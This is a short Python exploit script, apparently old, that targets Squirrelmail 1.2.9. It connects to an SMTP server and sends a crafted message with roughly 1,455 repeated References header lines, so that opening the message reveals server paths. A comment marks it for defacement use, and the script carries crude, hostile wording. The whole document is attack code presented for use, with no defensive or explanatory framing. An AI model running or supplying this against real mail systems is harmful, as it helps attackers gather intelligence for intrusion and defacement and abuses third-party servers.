
#!/usr/bin/env python
##
# Squirrelmail Path Disclosure Exploit
# F.O.R  D.E.F.A.C.E.D  O.N.L.Y!!
##
# Tested on: Linux, Apache 1.3.23, 
# PHP 4.2.1, Squirrelmail 1.2.9
##
# Usage: 
# [1] Change host and mbox vars vith correct
#     smtp host and your squirelmail mailbox
# [2] Execute squir.py
# [3] Go to your mailbox and open this msg
##

import socket
from time import sleep

host = '10.0.0.10'
mbox = 'your@squirrelbox.ru'

spls = 'References: <20030324135652.Gwtfwtfwftwtf\x0d\x0a'
h = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:   
 h.connect((host, 0x19))
except:
 print('socket error')
h.send('helo Im_Squirrelfucker\x0d\x0a')
sleep(2) 
h.send('mail from:<satan@hell.org>\x0d\x0a')
sleep(2)
h.send('rcpt to:<'+mbox+'>\x0d\x0a')
sleep(2)
h.send('data\x0d\x0a')
sleep(2)
h.send('Subject: Squirrelfucking\x0d\x0a')
sleep(2)
i = 0
while i < 0x5af:
 i += 1
 h.send(spls)
 sleep(2)
else: 
 pass
h.send('blablah\x0d\x0a')
sleep(2)
h.send('.\x0d\x0a')
sleep(2)
h.send('quit\x0a\x0a')
sleep(2)
h.close()

